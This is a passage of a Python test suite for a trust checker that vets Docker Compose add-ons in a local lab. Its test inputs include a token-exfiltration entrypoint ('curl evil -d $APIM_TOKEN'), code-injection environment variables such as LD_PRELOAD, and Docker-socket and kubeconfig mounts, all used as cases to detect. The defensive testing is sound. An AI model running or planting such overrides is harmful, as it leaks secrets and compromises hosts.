        def inside(arguments):
            arguments["context"].update(level=3, contract=5, contract_min=3)
        self.assertEqual(self.changed(CLEAN, inside)["state"], "ok")

    def test_t26_the_levels_that_mean_nothing_are_not_read(self):
        for level in (None, "99", 2.5, True, [], {}):
            def edit(arguments, level=level):
                arguments["context"]["level"] = level
            with self.subTest(level=level):
                self.assertEqual(self.changed(CLEAN, edit)["state"], "ok")

    def test_t27_a_unit_compose_cannot_read_is_blocked_with_the_last_line(self):
        verdict = self.judge("t27-unreadable")
        self.assertEqual(verdict["codes"], ["T27"])
        self.assertRegex(verdict["reasons"][0], r"^Cannot be read: failed to parse addons/t27-unreadable/compose\.yml: ")
        self.assertEqual(verdict["surface"], trust.empty_surface())

    def test_t27_no_path_of_this_machine_reaches_the_line(self):
        for error in (f"open {self.root}/addons/x/compose.yml: no such file", "failed to parse /Users/me/dev/lab/.lab/catalogs/ns/a.yml: bad",
                      "read /etc/hosts: denied", "validating /srv/a/b/c.yml: services must be a mapping"):
            def edit(arguments, error=error):
                arguments["unit_config"] = None
                arguments["context"]["error"] = error
            with self.subTest(error=error):
                reason = self.changed(CLEAN, edit)["reasons"][0]
                self.assertNotRegex(reason, r"/Users|/srv|/etc|\.lab/|" + re.escape(str(self.root)))

    def test_t27_a_message_without_words_or_too_long_is_said_short(self):
        def edit(arguments):
            arguments["unit_config"] = None
            arguments["context"]["error"] = "x " * 500
        self.assertLessEqual(len(self.changed(CLEAN, edit)["reasons"][0]), len("Cannot be read: ") + 160)
        def none(arguments):
            arguments["unit_config"] = None
            arguments["context"].pop("error", None)
        self.assertEqual(self.changed(CLEAN, none)["reasons"], [line("T27", last="unreadable")])

    def test_t27_a_readable_unit_has_no_such_reason(self):
        self.silent(CLEAN, "T27")

    def test_t29_an_item_that_says_whose_copy_it_is_is_blocked_and_one_of_this_machine_is_not(self):
        def claims(arguments):
            arguments["unit"]["meta"]["copy_of"] = "tour"
        self.assertEqual(self.changed(CLEAN, claims)["reasons"], [line("T29")])
        self.silent(CLEAN, "T29")

        def mine(arguments):
            claims(arguments)
            arguments["context"]["local"] = True
        self.assertEqual(self.changed(CLEAN, mine)["reasons"], [], "the person's copy says it, as the Lab wrote it")

    def test_t28_a_class_h_finding_with_no_declaration_is_told_off(self):
        self.assertEqual(self.judge("t03-privileged", listed=True)["reasons"], [line("T28", service="hostile-privileged")])

    def test_t28_a_declaration_passes(self):
        self.assertEqual(self.judge("h-privileged-declared", listed=True)["reasons"], [])

    def test_t28_names_the_services_that_say_nothing(self):
        def edit(arguments):
            arguments["own"] = ["hostile-a", "hostile-b", "hostile-c", "hostile-d", "hostile-e"]
            service = {"image": "busybox", "privileged": True}
            arguments["unit_config"]["services"] = {name: dict(service) for name in arguments["own"]}
            arguments["unit"]["meta"]["host_access"] = {"hostile-a": "I say why"}
        self.assertEqual(self.changed("h-privileged-declared", edit, listed=True)["reasons"],
                         [line("T28", service="hostile-b, hostile-c, hostile-d and 1 more")])


class Audience(Golden):
    """T24 from an audience that the caller measured (the command line, with `--online`): judge takes it as an argument and
    measures nothing. The Lab's own pipeline adds T24 with `add_reason` and passes neither key."""

    def test_a_public_unit_that_reaches_a_private_catalog_is_blocked_with_the_line_of_t24(self):
        verdict = self.judge(CLEAN, audience="public", closure_audiences=["private"])
        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", [line("T24")], ["T24"]))

    def test_every_other_pair_passes(self):
        for audience, theirs in (("public", ["public"]), ("public", []), ("private", ["private"]), ("private", ["public"]),
                                 ("private", ["public", "private"]), ("public", ["public", "public"])):
            with self.subTest(audience=audience, theirs=theirs):
                self.assertEqual(self.judge(CLEAN, audience=audience, closure_audiences=theirs)["state"], "ok")

    def test_one_private_catalog_among_public_ones_is_enough(self):
        for theirs in (["public", "private"], ["private", "public"], ("public", "private"), {"private"}, frozenset({"public", "private"})):
            with self.subTest(theirs=theirs):
                self.assertEqual(self.judge(CLEAN, audience="public", closure_audiences=theirs)["codes"], ["T24"])

    def test_nothing_is_said_of_an_audience_that_was_not_measured(self):
        """Offline, the command line gives neither key: T24 is not guessed."""
        for more in ({}, {"audience": "public"}, {"closure_audiences": ["private"]}):
            with self.subTest(more=more):
                self.assertEqual(self.judge(CLEAN, **more)["state"], "ok")

    def test_a_doubt_is_private(self):
        for audience, theirs, state in (("public", [None], "blocked"), ("public", ["internal"], "blocked"), ("public", [3], "blocked"),
                                        ("public", "private", "blocked"), ("public", None, "blocked"), ("public", 1, "blocked"),
                                        (None, ["private"], "ok"), ("whatever", ["private"], "ok"), (["public"], ["private"], "ok"),
                                        ({"public": 1}, ["public"], "ok"), ("PUBLIC", ["public"], "ok"), ("Public", ["private"], "ok")):
            with self.subTest(audience=audience, theirs=theirs):
                self.assertEqual(self.judge(CLEAN, audience=audience, closure_audiences=theirs)["state"], state)

    def test_the_reason_goes_with_the_others_in_the_order_of_the_rules(self):
        newer = regen.LEVELS[0] + 1   # a level this Lab does not read yet

        def edit(arguments):
            arguments["unit"]["references"] = ["HOME"]
            arguments["context"].update(audience="public", closure_audiences=["private"], level=newer)
        verdict = self.changed(CLEAN, edit)
        self.assertEqual(verdict["codes"], ["T20", "T24", "T26"])
        self.assertEqual(verdict["reasons"], [line("T20", names="HOME"), line("T24"),
                                              line("T26", 0, level=newer, min=regen.LEVELS[1], max=regen.LEVELS[0])])

    def test_a_unit_that_compose_could_not_read_is_still_judged_on_its_audience(self):
        verdict = self.judge("t23-include-outside", audience="public", closure_audiences=["private"])
        self.assertEqual(verdict["codes"], ["T23", "T24", "T27"])

    def test_a_unit_of_this_machine_is_not_blocked_by_it(self):
        verdict = self.judge(CLEAN, local=True, audience="public", closure_audiences=["private"])
        self.assertEqual((verdict["state"], verdict["reasons"]), ("ok", []))

    def test_the_line_the_pipeline_adds_is_not_said_twice(self):
        by_judge = self.judge(CLEAN, audience="public", closure_audiences=["private"])
        self.assertEqual(trust.add_reason(by_judge, "T24", line("T24")), by_judge)
        by_pipeline = trust.add_reason(self.judge(CLEAN), "T24", line("T24"))
        self.assertEqual((by_pipeline["reasons"], by_pipeline["codes"]), (by_judge["reasons"], by_judge["codes"]))

    def test_a_combined_closure_carries_it(self):
        mine = self.judge(CLEAN, audience="public", closure_audiences=["private"])
        self.assertEqual(trust.combine([mine, self.judge(CLEAN)])["reasons"], [line("T24")])

    def test_it_is_the_rule_of_the_resolver(self):
        for audience in ("public", "private", None):
            for other in ("public", "private", None):
                with self.subTest(audience=audience, other=other):
                    wanted = resolve.audience_blocked(resolve.rank(audience), resolve.rank(other))
                    self.assertEqual("T24" in self.judge(CLEAN, audience=audience or "?", closure_audiences=[other])["codes"],
                                     wanted)

    def test_the_arguments_are_left_as_they_were(self):
        arguments = self.args(CLEAN, audience="public", closure_audiences=["private", "public"])
        before = copy.deepcopy(arguments)
        trust.judge(**arguments)
        self.assertEqual(arguments, before)


class Collisions(Golden):
    """T21, from resolve.collisions with what judge says of a unit."""

    def test_t21_a_unit_that_defines_what_an_earlier_one_holds_is_blocked(self):
        verdict = regen.pipeline(self.root)["t21-name-clash"]
        self.assertEqual((verdict["state"], verdict["reasons"], verdict["codes"]), ("blocked", ["Same name as Echo"], ["T21"]))
        self.assertEqual(self.judge("t21-name-clash")["state"], "ok")

    def test_t21_a_unit_whose_names_nobody_holds_is_not(self):
        verdict = regen.pipeline(self.root)[CLEAN]
        self.assertNotIn("T21", verdict["codes"])

    def test_the_names_a_unit_can_clash_on(self):
        arguments = self.args(CLEAN)
        names = resolve.owned_names(arguments["unit_config"], arguments["core_config"], arguments["own"])
        self.assertEqual(names, {"services": ["hostile-clean"], "containers": [], "volumes": ["clean-data"]})


class Notes(Golden):
    """N01 to N05: restrictions that do not block."""

    def test_n01_a_seed_built_from_its_own_folder_is_not_the_labs(self):
        verdict = self.judge("n01-own-seed-code")
        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))

    def test_n01_the_labs_seeder_is_the_folder_of_the_seeder_or_an_image_the_core_names(self):
        verdict = self.judge(PLAYGROUND)
        self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([], "official"))
        def image(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean-seed"]
            service["build"] = None
            del service["build"]
            service["image"] = "example.invalid/hostile/seeder:1"
        self.assertEqual(self.changed(PLAYGROUND, image)["surface"]["seed"], "official")
        def other(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean-seed"]
            del service["build"]
            service["image"] = "example.invalid/other/seeder:1"
        self.assertEqual(self.changed(PLAYGROUND, other)["notes"], [trust.SEED_OWN])

    def test_n01_a_build_of_its_own_under_the_name_of_the_seeder_is_still_its_own(self):
        def edit(arguments):
            service = arguments["unit_config"]["services"]["hostile-clean-seed"]
            service["build"] = {"context": arguments["roots"]["unit"] + "/seed-image"}
            service["image"] = "example.invalid/hostile/seeder"
        verdict = self.changed(PLAYGROUND, edit)
        self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([trust.SEED_OWN], "custom"))

    def test_n01_a_unit_with_no_seed_has_none(self):
        self.assertIsNone(self.judge("p-terminal")["surface"]["seed"])
        self.assertEqual(self.judge("p-terminal")["notes"], [])

    def test_n01_the_seeders_folder_with_code_of_its_own_is_still_its_own_code(self):
        """The folder of the seeder is the seeder only when nothing else decides what runs in it: a Dockerfile of the unit's,
        an entrypoint, a path the interpreter reads from the seed folder. Real Compose output, one unit for each."""
        for name in ("n01-seeder-own-dockerfile", "n01-seeder-entrypoint", "n01-seeder-pythonpath"):
            with self.subTest(unit=name):
                verdict = self.judge(name)
                self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["seed"]), ("ok", [trust.SEED_OWN], "custom"))
        self.assertEqual(self.judge(PLAYGROUND)["notes"], [])

    def seed(self, edit):
        """The clean playground with `edit(seed service, arguments)` applied: the verdict."""
        def both(arguments):
            edit(arguments["unit_config"]["services"]["hostile-clean-seed"], arguments)
        return self.changed(PLAYGROUND, both)

    def test_n01_every_way_to_run_other_code_under_the_name_of_the_seeder(self):
        official = self.judge(PLAYGROUND)
        self.assertEqual((official["notes"], official["surface"]["seed"]), ([], "official"))
        build = lambda **more: (lambda service, arguments: service["build"].update(more))   # noqa: E731
        for label, edit in (
                ("entrypoint", lambda service, arguments: service.update(entrypoint=["sh", "-c", "curl evil -d $APIM_TOKEN"])),
                ("command", lambda service, arguments: service.update(command=["sh"])),
                ("empty entrypoint", lambda service, arguments: service.update(entrypoint=[])),
                ("working_dir", lambda service, arguments: service.update(working_dir="/seed")),
                ("healthcheck", lambda service, arguments: service.update(healthcheck={"test": ["CMD", "sh", "-c", "env"]})),
                ("config over the code", lambda service, arguments: service.update(configs=[{"source": "c", "target": "/app/seed.py"}])),
                ("secret over the code", lambda service, arguments: service.update(secrets=[{"source": "s", "target": "/app/seed.py"}])),
                ("dockerfile of the unit's", build(dockerfile="../.lab/catalogs/hostile/playgrounds/p-clean-playground/Dockerfile")),
                ("dockerfile_inline", build(dockerfile_inline="FROM evil")), ("target", build(target="evil")),
                ("args", build(args={"X": "1"})), ("additional_contexts", build(additional_contexts={"app": "docker-image://evil/img"})),
                ("ssh", build(ssh=["default"])), ("tags", build(tags=["evil"])), ("network", build(network="host")),
                ("a build that is a text", lambda service, arguments: service.update(build=arguments["roots"]["unit"])),
                ("a bind over the code", lambda service, arguments: service["volumes"].append(
                    {"type": "bind", "source": arguments["roots"]["unit"] + "/evil.py", "target": "/app/seed.py", "read_only": True})),
                ("a volume over the code", lambda service, arguments: service["volumes"].append(
                    {"type": "volume", "source": "x", "target": "/app"})),
                ("a bind as a text", lambda service, arguments: service.update(volumes=["./evil.py:/app/seed.py:ro"])),
                ("a tmpfs over the code", lambda service, arguments: service["volumes"].append({"type": "tmpfs", "target": "/app"})),
        ):
            with self.subTest(override=label):
                verdict = self.seed(edit)
                self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([trust.SEED_OWN], "custom"))

    def test_n01_the_variables_that_make_an_interpreter_load_code_from_a_folder(self):
        for name in ("PYTHONPATH", "PYTHONSTARTUP", "PYTHONHOME", "PYTHONUSERBASE", "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
                     "PATH", "HOME", "OPENSSL_CONF", "GCONV_PATH", "LOCPATH"):
            with self.subTest(name=name):
                verdict = self.seed(lambda service, arguments, name=name: service["environment"].update({name: "/seed"}))
                self.assertEqual(verdict["notes"], [trust.SEED_OWN])
                as_list = self.seed(lambda service, arguments, name=name: service.update(environment=[f"{name}=/seed", "A=b"]))
                self.assertIn(trust.SEED_OWN, as_list["notes"])
                bare = self.seed(lambda service, arguments, name=name: service.update(environment=[name]))
                self.assertIn(trust.SEED_OWN, bare["notes"])

    def test_n01_a_seed_may_set_what_it_likes_that_is_not_one_of_those(self):
        def edit(service, arguments):
            service["environment"].update({"APIM_TOKEN": "x", "MY_PATH": "/seed", "PATHS": "x", "HOMEPAGE": "y", "SEED_PROTECTIONS": "on"})
            service.update(command=None, entrypoint=None, working_dir=None, healthcheck=None, configs=[], secrets=None)
            service["build"] = {"context": service["build"]["context"]}
        verdict = self.seed(edit)
        self.assertEqual((verdict["notes"], verdict["surface"]["seed"]), ([], "official"))

    def test_n01_an_image_of_the_seeder_with_a_command_of_its_own_is_its_own(self):
        def edit(service, arguments):
            del service["build"]
            service.update(image="example.invalid/hostile/seeder:1", entrypoint=["sh"])
        self.assertEqual(self.seed(edit)["notes"], [trust.SEED_OWN])

    def test_n01_every_seed_service_of_the_unit_is_held_to_it(self):
        def two(arguments):
            seed = copy.deepcopy(arguments["unit_config"]["services"]["hostile-clean-seed"])
            seed["entrypoint"] = ["sh"]
            arguments["unit_config"]["services"]["hostile-second-seed"] = seed
            arguments["own"] = [*arguments["own"], "hostile-second-seed"]
        self.assertEqual(self.changed(PLAYGROUND, two)["notes"], [trust.SEED_OWN])

    def test_the_seeder_function_holds_a_seed_to_the_same(self):
        arguments = self.args(PLAYGROUND)
        config, roots = arguments["unit_config"], arguments["roots"]
        self.assertTrue(trust.seeder_ok(config, roots, [], os.path.realpath))
        config = copy.deepcopy(config)
        config["services"]["hostile-clean-seed"]["entrypoint"] = ["x"]
        self.assertFalse(trust.seeder_ok(config, roots, [], os.path.realpath))
        config["services"]["hostile-clean-seed"]["entrypoint"] = None
        config["services"]["hostile-clean-seed"]["build"]["target"] = "x"
        self.assertFalse(trust.seeder_ok(config, roots, [], os.path.realpath))
        for odd in (7, "x", ["x"], {"labels": 7}, {"labels": {"io.gravitee.role": "other"}, "build": 7}):   # no seed service
            self.assertTrue(trust.seeder_ok({"services": {"a": odd}}, roots, [], os.path.realpath), odd)
        for odd in ({"build": 7}, {"build": ["x"]}, {"volumes": 7}, {"environment": 7}, {}):   # one, and not the Lab's
            odd["labels"] = {"io.gravitee.role": "seed"}
            self.assertFalse(trust.seeder_ok({"services": {"a": odd}}, roots, [], os.path.realpath), odd)

    def test_n02_seed_data_that_reads_the_token_of_a_deploy(self):
        verdict = self.judge("n02-seed-reads-token")
        self.assertEqual((verdict["state"], verdict["notes"]), ("ok", [trust.SEED_TOKEN]))

    def test_n02_a_secret_the_unit_does_not_define_reads_the_token_too(self):
        self.assertEqual(self.judge("n02-seed-reads-foreign-setting")["notes"], [trust.SEED_TOKEN])

    def test_n02_a_secret_the_unit_defines_in_its_own_container_does_not(self):
        def edit(arguments):
            arguments["unit"]["seed_references"] = ["HOSTILE_DEMO_PASSWORD", "HOSTILE_MCP_SECRET", "APIM_GATEWAY_URL"]
            arguments["unit_config"]["services"]["hostile-clean-seed"]["environment"]["HOSTILE_MCP_SECRET"] = "x"
        self.assertEqual(self.changed(PLAYGROUND, edit)["notes"], [])
        def token(arguments):
            arguments["unit"]["seed_references"] = ["APIM_TOKEN"]
            arguments["unit_config"]["services"]["hostile-clean-seed"]["environment"]["APIM_TOKEN"] = "x"
        self.assertEqual(self.changed(PLAYGROUND, token)["notes"], [trust.SEED_TOKEN])

    def test_n02_the_names_that_are_not_secrets_do_not(self):
        for name in ("APIM_GATEWAY_URL", "AM_TOKEN_URL", "KAFKA_TLS_TYPE", "SECRET_MANAGER_HOST", "TOKEN_TIMEOUT", "REDIS_PASSWORD_FILE"):
            def edit(arguments, name=name):
                arguments["unit"]["seed_references"] = [name]
                arguments["unit_config"]["services"]["hostile-clean-seed"]["environment"][name] = "x"
                arguments["unit_config"]["services"]["hostile-clean-seed"]["environment"].pop(name)
            with self.subTest(name=name):
                self.assertNotIn(trust.SEED_TOKEN, self.changed(PLAYGROUND, edit, core_variables=[name])["notes"])

    def test_n02_the_patterns_are_the_ones_of_make_check(self):
        from lab_ui.library import check
        self.assertEqual(trust.SECRET_NAME.pattern, check.SECRET_NAME.pattern)
        self.assertEqual(trust.SECRET_NAME.flags, check.SECRET_NAME.flags)
        self.assertEqual(trust.NOT_SECRET.pattern, check.NOT_SECRET.pattern)

    def test_n03_a_console_that_is_not_on_this_machine_is_not_opened(self):
        self.assertEqual(self.judge("n03-external-console")["notes"], [line("N03")])

    def test_n03_a_console_on_this_machine_is_fine(self):
        self.assertEqual(self.judge(CLEAN)["notes"], [])

    def test_n03_a_host_check_is_held_to_the_same(self):
        for url, ok in (("http://localhost:11434/api/tags", True), ("https://huggingface.co", False)):
            def edit(arguments, url=url):
                arguments["unit"]["meta"]["requires"] = {"host": [{"name": "x", "check": url}]}
            with self.subTest(url=url):
                self.assertEqual(self.changed(CLEAN, edit)["notes"] == [], ok)

    def test_n03_what_is_on_this_machine(self):
        for url, local in (("http://localhost", True), ("https://localhost:8443/a?b=c#d", True), ("http://127.0.0.1:9000", True),
                           ("http://[::1]:8080/x", True), ("http://host.docker.internal:11434", True), ("HTTP://LOCALHOST", True),
                           ("http://localhost.example.invalid", False), ("http://localhost@example.invalid", False),
                           ("http://example.invalid\\@localhost", False), ("http://user:pw@localhost", False),
                           ("http://127.0.0.1.nip.io", False), ("http://localhost:99999999", False), ("ftp://localhost", False),
                           ("//localhost", False), ("localhost", False), ("http://localhost /x", False), ("http://localhost\\x", False),
                           ("http://[::2]", False), ("http://0.0.0.0", False), ("", False), (None, False), (7, False)):
            with self.subTest(url=url):
                self.assertEqual(trust.local_address(url), local)

    def test_n04_a_gateway_declared_by_a_catalog_that_is_neither_listed_allowed_nor_local(self):
        verdict = self.judge("n04-foreign-gateway")
        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["reads"]), ("ok", [line("N04")], []))
        self.assertFalse(trust.declared_ok({}))

    def test_n04_a_listed_an_allowed_or_a_personal_catalog_may_declare_one_and_the_token_is_said(self):
        for more in ({"listed": True}, {"allowed": True}, {"local": True}):
            with self.subTest(more=more):
                verdict = self.judge("n04-foreign-gateway", **more)
                self.assertEqual((verdict["notes"], verdict["surface"]["reads"]), ([], ["gateway token"]))
        self.assertTrue(trust.declared_ok({"host_ok": True}))
        self.assertTrue(trust.declared_ok({"local": True}))
        self.assertFalse(trust.declared_ok({"listed": False, "host_ok": False}))
        self.assertFalse(trust.declared_ok(None))

    def test_n04_a_gateway_in_a_wrong_shape_is_no_declaration(self):
        for gateway in (None, {}, "cloud", ["cloud"]):
            def edit(arguments, gateway=gateway):
                arguments["unit"]["meta"]["gateway"] = gateway
            with self.subTest(gateway=gateway):
                self.assertEqual(self.changed("n04-foreign-gateway", edit)["notes"], [])

    def test_n05_a_terminal_in_a_service_of_the_platform_is_not_offered(self):
        verdict = self.judge("n05-foreign-terminal")
        self.assertEqual((verdict["state"], verdict["notes"], verdict["surface"]["shell"]), ("ok", [line("N05")], None))

    def test_n05_a_terminal_in_a_service_of_its_own_is_offered_and_said(self):
        verdict = self.judge("p-terminal")
        self.assertEqual((verdict["notes"], verdict["surface"]["shell"]), ([], "hostile-terminal-shell"))

    def test_n05_the_terminal_of_a_unit_in_the_services_it_brings_or_not_its_seed(self):
        arguments = self.args(PLAYGROUND)
        own = arguments["own"]
        self.assertTrue(trust.terminal_ok({"meta": {"terminal": "hostile-clean-app"}, "seed": "hostile-clean-seed"}, own, set()))
        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "hostile-clean-seed"}, "seed": "hostile-clean-seed"}, own, set()))
        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "hostile-clean-seed"}, "seed": ["hostile-clean-seed"]}, own, set()))
        self.assertFalse(trust.terminal_ok({"meta": {"terminal": "apim-gateway"}}, own, {"redis"}))
        self.assertTrue(trust.terminal_ok({"meta": {"terminal": "redis"}}, own, {"redis"}))
        self.assertTrue(trust.terminal_ok({"meta": {}}, own, set()))
        self.assertTrue(trust.terminal_ok({"terminal": None, "meta": {"terminal": "apim-gateway"}}, own, set()))
        self.assertFalse(trust.terminal_ok({"terminal": "apim-gateway"}, own, set()))
        self.assertTrue(trust.terminal_ok({"meta": {"terminal": {"service": "hostile-clean-app"}}}, own, set()))
        self.assertTrue(trust.terminal_ok({"meta": {"terminal": ["hostile-clean-app", {"service": "hostile-clean-seed2"}]}}, own + ["hostile-clean-seed2"], set()))
        for odd in ("", [], {}, 7, [7], {"service": 7}, ["x", None], {"other": "x"}):
            self.assertFalse(trust.terminal_ok({"meta": {"terminal": odd}}, own, set()), odd)

    def test_the_notes_never_block(self):
        for name in ("n01-own-seed-code", "n02-seed-reads-token", "n03-external-console", "n04-foreign-gateway", "n05-foreign-terminal"):
            self.assertEqual(self.judge(name)["state"], "ok", name)

    def test_the_notes_of_a_unit_of_this_machine_stay_but_its_gateway_is_its_own(self):
        self.assertEqual(self.judge("n01-own-seed-code", local=True)["notes"], [trust.SEED_OWN])
        self.assertEqual(self.judge("n03-external-console", local=True)["notes"], [line("N03")])
        self.assertEqual(self.judge("n05-foreign-terminal", local=True)["notes"], [line("N05")])
        self.assertEqual(self.judge("n04-foreign-gateway", local=True)["notes"], [])


class Surface(Golden):
    """What the preview shows."""

    def test_what_a_clean_unit_will_do(self):
        surface = self.judge(CLEAN)["surface"]
        self.assertEqual(surface, {"images": [], "builds": [{"service": "hostile-clean", "source": "local"}], "ports": [8397],
                                   "core": [], "reads": [], "plugins": [], "seed": None, "shell": None, "uses_machine": [],
                                   "needs": []})

    def test_the_images_without_their_tags_and_the_builds_by_source(self):
        def edit(arguments):
            services = arguments["unit_config"]["services"]
            services["hostile-clean"].pop("build")
            services["hostile-clean"]["image"] = "registry.invalid:5000/team/app:1.2@sha256:abc"
            services["other"] = {"image": "redis"}
            services["remote"] = {"build": {"context": "https://user:pw@example.invalid/org/app.git#main"}}
            services["scp"] = {"build": {"context": "git@example.invalid:org/lib.git#0123"}}
            services["short"] = {"build": {"context": "github.com/org/tool"}}
            arguments["own"] += ["other", "remote", "scp", "short"]
        surface = self.changed(CLEAN, edit)["surface"]
        self.assertEqual(surface["images"], ["redis", "registry.invalid:5000/team/app"])
        self.assertEqual([(b["service"], b["source"]) for b in surface["builds"]],
                         [("remote", "example.invalid/org/app"), ("scp", "example.invalid/org/lib"), ("short", "github.com/org/tool")])

    def test_the_ports_it_publishes_sorted_and_the_ones_with_no_fixed_port_left_out(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["ports"] = [
                {"host_ip": "127.0.0.1", "target": 1, "published": "9000"}, {"host_ip": "127.0.0.1", "target": 1, "published": "8100"},
                {"host_ip": "127.0.0.1", "target": 1}, "127.0.0.1:9100:1"]
        self.assertEqual(self.changed(CLEAN, edit)["surface"]["ports"], [8100, 9000])

    def test_what_it_adds_to_the_platform_by_its_label(self):
        self.assertEqual(self.judge("p-overlay-ok")["surface"]["core"][0]["label"], "Gateway")
        def edit(arguments):
            arguments["overlaid"] = {"redis": {"environment": {"A": "1"}}, "unknown-service": {"labels": {"a": "b"}}}
        core = self.changed("p-overlay-ok", edit)["surface"]["core"]
        self.assertEqual([item["service"] for item in core], ["redis", "unknown-service"])
        self.assertEqual(core[1]["label"], "unknown-service")

    def test_the_plugin_folders_it_mounts(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-clean"]["volumes"] = [
                {"type": "bind", "source": str(self.root / "plugins/apim"), "target": "/a"},
                {"type": "bind", "source": str(self.root / "plugins/am/x"), "target": "/b", "read_only": True},
                {"type": "volume", "source": "plugins", "target": "/c"}]
        self.assertEqual(self.changed(CLEAN, edit)["surface"]["plugins"], ["am", "apim"])

    def test_what_it_reads_from_the_machine(self):
        def edit(arguments):
            arguments["unit"]["references"] = ["GRAVITEE_LICENSE", "FIXTURE_SHARED_TOKEN", "HOSTILE_X"]
        verdict = self.changed(CLEAN, edit)
        self.assertEqual(verdict["surface"]["reads"], ["license", "FIXTURE_SHARED_TOKEN"])
        self.assertEqual(self.changed(CLEAN, edit, listed=True)["surface"]["reads"], ["license"])

    def test_what_it_uses_of_this_machine_with_the_authors_reason_cleaned(self):
        def edit(arguments):
            arguments["unit"]["meta"]["host_access"] = {"hostile-privileged": "Runs\x00 a  service\nmanager " + "x" * 300}
        item = self.changed("t03-privileged", edit)["surface"]["uses_machine"][0]
        self.assertEqual((item["service"], item["label"], item["what"]), ("hostile-privileged", "hostile-privileged", ["runs privileged"]))
        self.assertTrue(item["why"].startswith("Runs a service manager xxx"))
        self.assertLessEqual(len(item["why"]), 200)
        self.assertNotIn("\x00", item["why"])
        self.assertEqual(self.judge("t03-privileged")["surface"]["uses_machine"][0]["why"], "")

    def test_the_label_of_a_service_that_uses_the_machine_is_its_own(self):
        def edit(arguments):
            arguments["unit_config"]["services"]["hostile-privileged"]["labels"] = {"io.gravitee.name": "Kubernetes"}
        self.assertEqual(self.changed("t03-privileged", edit)["surface"]["uses_machine"][0]["label"], "Kubernetes")

    def test_the_catalogs_a_unit_includes_from(self):
        self.assertEqual(self.judge("t24-public-needs-private")["surface"]["needs"], ["partner"])
        self.assertEqual(self.judge("p-pair")["surface"]["needs"], [])

    def test_the_surface_function_gives_the_surface_of_the_verdict(self):
        for name in (CLEAN, PLAYGROUND, "n02-seed-reads-token", "h-privileged-declared", "p-overlay-ok", "p-terminal"):
            arguments = self.args(name, listed=True)
            context = dict(arguments["context"], unit=arguments["unit"])
            with self.subTest(unit=name):
                self.assertEqual(trust.surface(arguments["unit_config"], arguments["core_config"], arguments["own"],
                                               arguments["overlaid"], arguments["roots"], context),
                                 trust.judge(**arguments)["surface"])
        self.assertEqual(trust.surface(None, {}, [], {}, {}, {}), trust.empty_surface())

    def test_surfaces_add_up(self):
        one = {"images": ["a"], "builds": [{"service": "x", "source": "local"}], "ports": [2, 1], "core": [{"service": "g", "label": "G", "keys": ["environment"]}],
               "reads": ["license"], "plugins": [], "seed": "official", "shell": None, "uses_machine": [], "needs": ["p"]}
        two = {"images": ["a", "b"], "builds": [{"service": "x", "source": "local"}, {"service": "y", "source": "local"}], "ports": [1, 3],
               "core": [{"service": "g", "label": "G", "keys": ["volumes"]}, {"service": "h", "label": "H", "keys": ["ports"]}],
               "reads": [], "plugins": ["apim"], "seed": "custom", "shell": "s", "uses_machine": [{"service": "k"}], "needs": ["p", "q"]}
        total = trust.sum_surfaces([one, two])
        self.assertEqual(total["images"], ["a", "b"])
        self.assertEqual(total["ports"], [1, 2, 3])
        self.assertEqual([b["service"] for b in total["builds"]], ["x", "y"])
        self.assertEqual(total["core"], [{"service": "g", "label": "G", "keys": ["environment", "volumes"]},
                                         {"service": "h", "label": "H", "keys": ["ports"]}])
        self.assertEqual((total["seed"], total["shell"], total["needs"], total["plugins"]), ("custom", "s", ["p", "q"], ["apim"]))
        self.assertEqual(trust.sum_surfaces([]), trust.empty_surface())
        self.assertEqual(trust.sum_surfaces([one])["seed"], "official")
        self.assertNotIn(one["core"][0]["keys"], [total["core"][0]["keys"]])


class Vocabulary(Case):

    def test_elevations_are_the_words_of_the_policy(self):
        for service, what in (({"privileged": True}, ["runs privileged"]), ({"use_api_socket": True}, ["reaches Docker"]),
                              ({"provider": {"type": "x"}}, ["runs a program on this machine"]),
                              ({"network_mode": "host"}, ["shares the network of this machine"]),
                              ({"network_mode": "container:x"}, ["shares the network of another container"]),
                              ({"pid": "host", "ipc": "host"}, ["shares the processes of this machine", "shares the memory of this machine"]),
                              ({"cap_add": ["NET_ADMIN", "SYS_ADMIN"]}, ["adds the capabilities NET_ADMIN, SYS_ADMIN"]),
                              ({"devices": [{"source": "/dev/fuse"}]}, ["reaches the devices of this machine"]),
                              ({"security_opt": ["seccomp:unconfined"]}, ["lowers its isolation"]),
                              ({"volumes": [{"type": "bind", "source": "/var/run/docker.sock", "target": "/x"}]}, ["mounts the Docker socket"]),
                              ({"volumes": [{"type": "npipe", "source": "x", "target": "/x"}]}, ["mounts the Docker socket"]),
                              ({"privileged": True, "cap_add": ["X"]}, ["runs privileged", "adds the capabilities X"]),
                              ({"image": "busybox"}, []), (None, []), ("x", [])):
            with self.subTest(service=service):
                self.assertEqual(trust.elevations(service), what)

    def test_a_bind_is_described_with_the_roots_and_a_path_under_home_is_short(self):
        roots = trust.build_roots("/proj", "/proj/.lab/catalogs/ns/addons/a", realpath=lambda path: path)
        service = {"volumes": [{"type": "bind", "source": "/home/me/.kube/config", "target": "/k"},
                               {"type": "bind", "source": "/proj/.lab/catalogs/ns/addons/a/data", "target": "/d"},
                               {"type": "bind", "source": "/opt/x", "target": "/o"}]}
        self.assertEqual(trust.elevations(service), [])
        self.assertEqual(trust.elevations(service, roots, lambda path: path, "/home/me/"),
                         ["mounts ~/.kube/config of this machine", "mounts /opt/x of this machine"])
        self.assertEqual(trust.elevations(service, roots, lambda path: path), ["mounts /home/me/.kube/config of this machine",
                                                                                 "mounts /opt/x of this machine"])

    def test_the_reason_lines_are_the_lines_of_section_8_3(self):
        self.assertEqual({code: len(rule["lines"]) for code, rule in trust.RULES.items() if len(rule["lines"]) > 1},
